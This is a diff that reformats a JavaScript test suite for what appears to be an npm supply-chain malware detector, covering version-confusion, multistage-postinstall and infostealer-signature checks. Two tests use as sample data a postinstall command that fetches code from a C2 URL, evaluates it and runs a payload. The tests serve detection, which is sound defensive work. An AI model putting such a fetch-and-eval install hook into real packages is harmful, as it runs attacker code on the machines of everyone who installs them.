@@ -8,7 +8,7 @@ describe('D6a — tier1-version-confusion', () => {
   test('D6a: detects exact sentinel version 99.99.99', async () => {
     const pkg = { name: 'internal-utils', version: '99.99.99' };
     const findings = await detectors.runAll(pkg);
-    const match = findings.find(f => f.id === 'TIER1-VERSION-CONFUSION');
+    const match = findings.find((f) => f.id === 'TIER1-VERSION-CONFUSION');
     assert(match, 'Expected TIER1-VERSION-CONFUSION finding');
     assert.equal(match.confidence, 'HIGH');
     assert(match.confidenceScore >= 80, `confidenceScore ${match.confidenceScore} < 80`);
@@ -18,23 +18,26 @@ describe('D6a — tier1-version-confusion', () => {
     for (const version of ['9.9.9', '10.10.10', '11.11.11']) {
       const pkg = { name: 'corp-auth', version };
       const findings = await detectors.runAll(pkg);
-      const match = findings.find(f => f.id === 'TIER1-VERSION-CONFUSION');
+      const match = findings.find((f) => f.id === 'TIER1-VERSION-CONFUSION');
       assert(match, `Expected finding for version ${version}`);
-      assert(match.confidenceScore >= 60, `confidenceScore ${match.confidenceScore} < 60 for version ${version}`);
+      assert(
+        match.confidenceScore >= 60,
+        `confidenceScore ${match.confidenceScore} < 60 for version ${version}`
+      );
     }
   });
 
   test('D6a: no finding on legitimate semver', async () => {
     const pkg = { name: 'lodash', version: '4.17.21' };
     const findings = await detectors.runAll(pkg);
-    const match = findings.find(f => f.id === 'TIER1-VERSION-CONFUSION');
+    const match = findings.find((f) => f.id === 'TIER1-VERSION-CONFUSION');
     assert(!match);
   });
 
   test('D6a: no finding on KNOWN_REPUTABLE_PACKAGES regardless of version', async () => {
     const pkg = { name: 'react', version: '99.99.99' };
     const findings = await detectors.runAll(pkg);
-    const match = findings.find(f => f.id === 'TIER1-VERSION-CONFUSION');
+    const match = findings.find((f) => f.id === 'TIER1-VERSION-CONFUSION');
     assert(!match);
   });
 });
@@ -47,11 +50,12 @@ describe('D6b — tier1-multistage-postinstall', () => {
       name: 'malicious-pkg',
       version: '1.0.0',
       scripts: {
-        postinstall: 'node -e "fetch(process.env.C2_URL).then(r=>r.text()).then(eval)" && execFile("./payload")',
+        postinstall:
+          'node -e "fetch(process.env.C2_URL).then(r=>r.text()).then(eval)" && execFile("./payload")',
       },
     };
     const findings = await detectors.runAll(pkg);
-    const match = findings.find(f => f.id === 'TIER1-MULTISTAGE-POSTINSTALL');
+    const match = findings.find((f) => f.id === 'TIER1-MULTISTAGE-POSTINSTALL');
     assert(match, 'Expected TIER1-MULTISTAGE-POSTINSTALL finding');
     assert.equal(match.confidence, 'HIGH');
     assert(match.confidenceScore >= 80, `confidenceScore ${match.confidenceScore} < 80`);
@@ -66,7 +70,7 @@ describe('D6b — tier1-multistage-postinstall', () => {
       },
     };
     const findings = await detectors.runAll(pkg);
-    const match = findings.find(f => f.id === 'TIER1-MULTISTAGE-POSTINSTALL');
+    const match = findings.find((f) => f.id === 'TIER1-MULTISTAGE-POSTINSTALL');
     assert(match, 'Expected TIER1-MULTISTAGE-POSTINSTALL finding');
     assert(match.confidenceScore >= 75, `confidenceScore ${match.confidenceScore} < 75`);
   });
@@ -80,7 +84,7 @@ describe('D6b — tier1-multistage-postinstall', () => {
       },
     };
     const findings = await detectors.runAll(pkg);
-    const match = findings.find(f => f.id === 'TIER1-MULTISTAGE-POSTINSTALL');
+    const match = findings.find((f) => f.id === 'TIER1-MULTISTAGE-POSTINSTALL');
     assert(!match);
   });
 
@@ -89,11 +93,12 @@ describe('D6b — tier1-multistage-postinstall', () => {
       name: 'dual-pkg',
       version: '1.0.0',
       scripts: {
-        postinstall: 'node -e "fetch(process.env.C2_URL).then(r=>r.text()).then(eval)" && execFile("./payload")',
+        postinstall:
+          'node -e "fetch(process.env.C2_URL).then(r=>r.text()).then(eval)" && execFile("./payload")',
       },
     };
     const findings = await detectors.runAll(pkg);
-    const d6bMatches = findings.filter(f => f.id === 'TIER1-MULTISTAGE-POSTINSTALL');
+    const d6bMatches = findings.filter((f) => f.id === 'TIER1-MULTISTAGE-POSTINSTALL');
     assert(d6bMatches.length > 0, 'Expected at least one TIER1-MULTISTAGE-POSTINSTALL finding');
     assert.equal(d6bMatches[0].id, 'TIER1-MULTISTAGE-POSTINSTALL');
     assert(d6bMatches[0].id !== 'ATK-003');
@@ -105,12 +110,17 @@ describe('D6b — tier1-multistage-postinstall', () => {
 describe('D2 — named signature', () => {
   test('D2 Miasma signature: detects "Miasma: The Spreading Blight" → CRITICAL', async () => {
     const pkg = { name: 'test-pkg', version: '1.0.0' };
-    const jsFiles = [{ path: 'evil.js', content: 'const id = "Miasma: The Spreading Blight"; doEvil();' }];
+    const jsFiles = [
+      { path: 'evil.js', content: 'const id = "Miasma: The Spreading Blight"; doEvil();' },
+    ];
     const findings = await detectors.runAll(pkg, jsFiles, {}, []);
-    const match = findings.find(f => f.id === 'TIER1-INFOSTEALER');
+    const match = findings.find((f) => f.id === 'TIER1-INFOSTEALER');
     assert(match, 'Expected TIER1-INFOSTEALER finding from Miasma signature');
     assert.equal(match.confidence, 'CRITICAL');
     assert.equal(match.confidenceScore, 98);
-    assert(match.evidence.some(e => e.includes('Miasma: The Spreading Blight')), 'evidence should contain the signature string');
+    assert(
+      match.evidence.some((e) => e.includes('Miasma: The Spreading Blight')),
+      'evidence should contain the signature string'
+    );
   });
 });
